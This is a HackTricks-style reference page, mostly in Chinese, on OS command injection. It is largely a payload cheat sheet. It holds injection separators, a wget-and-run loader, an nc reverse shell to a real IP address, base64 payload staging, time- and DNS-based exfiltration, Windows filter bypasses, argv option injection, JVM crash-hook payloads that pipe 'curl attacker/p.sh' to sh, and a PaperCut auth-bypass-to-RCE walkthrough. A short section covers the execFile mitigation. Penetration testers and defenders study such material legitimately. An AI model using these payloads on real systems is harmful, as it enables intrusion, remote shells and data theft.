# Command Injection

{{#include ../banners/hacktricks-training.md}}

## 什么是 command Injection?

通过 **command injection**，攻击者可以在承载应用程序的服务器上执行任意操作系统命令。因此，应用程序及其所有数据可能被完全攻破。这些命令的执行通常使攻击者能够获得对应用环境和底层系统的未授权访问或控制权限。

### 上下文

取决于 **您的输入被注入的位置**，您可能需要在命令之前**结束带引号的上下文**（使用 `"` 或 `'`）来终止原有的引用环境。

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **限制** Bypasses

如果你想执行 **arbitrary commands inside a linux machine**，你会想阅读这些 **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **示例**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### 参数

以下是可能易受 code injection 和类似 RCE 漏洞影响的前 25 个参数 (来自 [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

提取数据：逐字符
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

基于来自 `https://github.com/HoLyVieR/dnsbin` 的工具，也托管在 dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
在线工具用于检测基于 DNS 的数据外传：

- dnsbin.zhack.ca
- pingb.in

### 绕过过滤

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

当审计 JavaScript/TypeScript 后端时，通常会遇到 Node.js `child_process` API。
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` 会启动一个 **shell** (`/bin/sh -c`)，因此任何对 shell 有特殊含义的字符（反引号、`;`、`&&`、`|`、`$()`、…）在将用户输入拼接到字符串时都会导致 **command injection**。

**Mitigation:**  使用 `execFile()`（或在不使用 `shell` 选项的情况下使用 `spawn()`），并将 **每个参数作为独立的数组元素** 提供，这样就不会涉及 shell：
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

并非所有注入都需要 shell 元字符。如果应用将不受信任的字符串作为参数传递给系统工具（即使使用 `execve`/`execFile` 且没有 shell），很多程序仍会把以 `-` 或 `--` 开头的参数解析为选项。这允许攻击者切换模式、更改输出路径或触发危险行为，而无需进入 shell。

典型出现的场景：

- 嵌入式 web UI/CGI handlers 在构建像 `ping <user>`、`tcpdump -i <iface> -w <file>`、`curl <url>` 之类的命令时。
- 中央化的 CGI 路由器（例如 `/cgi-bin/<something>.cgi`，带有像 `topicurl=<handler>` 这样的选择参数），多个处理器重用相同的薄弱验证器时会出现问题。

可尝试的办法：

- 提供以 `-`/`--` 开头的值，让下游工具将其作为标志消费。
- 滥用会改变行为或写入文件的标志，例如：
- `ping`: `-f`/`-c 100000` 来压垮设备（DoS）
- `curl`: `-o /tmp/x` 写入任意路径，`-K <url>` 加载受控的配置
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` 在不安全的包装器中实现轮换后执行
- 如果程序支持 `--` 结束选项，尝试绕过那些错误位置预置 `--` 的简单缓解方法。

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM 诊断回调以保证 exec

任何允许你 **注入 JVM 命令行参数** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) 都可以在不触及应用字节码的情况下变成可靠的 RCE：

1. **强制确定性崩溃** —— 通过缩小 metaspace 或 heap：`-XX:MaxMetaspaceSize=16m`（或一个很小的 `-Xmx`）。这可以保证即使在早期 bootstrap 期间也会触发 `OutOfMemoryError`。
2. **附加错误钩子**：`-XX:OnOutOfMemoryError="<cmd>"` 或 `-XX:OnError="<cmd>"` 在 JVM 中止时执行任意操作系统命令。
3. 可选地添加 `-XX:+CrashOnOutOfMemoryError` 来避免恢复尝试，并使 payload 成为一次性触发。

示例 payloads:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Because these diagnostics are parsed by the JVM itself, no shell metacharacters are required and the command runs with the same integrity level as the launcher. Desktop IPC bugs that forward user-supplied JVM flags (see [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)) therefore translate directly into OS command execution.

## PaperCut NG/MF SetupCompleted auth bypass -> print scripting RCE

- Vulnerable NG/MF builds (e.g., 22.0.5 Build 63914) expose `/app?service=page/SetupCompleted`; browsing there and clicking **Login** returns a valid `JSESSIONID` without credentials (在 setup 流程中发生的认证绕过).
- 在 **Options → Config Editor** 中，将 `print-and-device.script.enabled=Y` 和 `print.script.sandboxed=N` 设置为启用打印脚本并禁用沙箱。
- 在打印机的 **Scripting** 选项卡中，启用脚本并保持 `printJobHook` 已定义以避免验证错误，但将 payload 放在函数的 **外部**，这样在点击 **Apply** 时会立即执行（不需要打印任务）：
```js
function printJobHook(inputs, actions) {}
cmd = ["bash","-c","curl http://attacker/hit"];
java.lang.Runtime.getRuntime().exec(cmd);
```
- 将 callback 替换为 reverse shell；如果 UI/PoC 无法处理 pipes/redirects，先用一个命令 stage 一个 payload，然后用第二个 request exec 它。
- Horizon3's [CVE-2023-27350.py](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py) 自动化 auth bypass、config flips、command execution 和 rollback——当服务仅能在内部访问时，通过上游代理（例如 `proxychains` → Squid）运行它。

## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)
- [PaperCut NG/MF SetupCompleted auth bypass → print scripting RCE](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [CVE-2023-27350.py (auth bypass + print scripting automation)](https://github.com/horizon3ai/CVE-2023-27350/blob/main/CVE-2023-27350.py)

{{#include ../banners/hacktricks-training.md}}
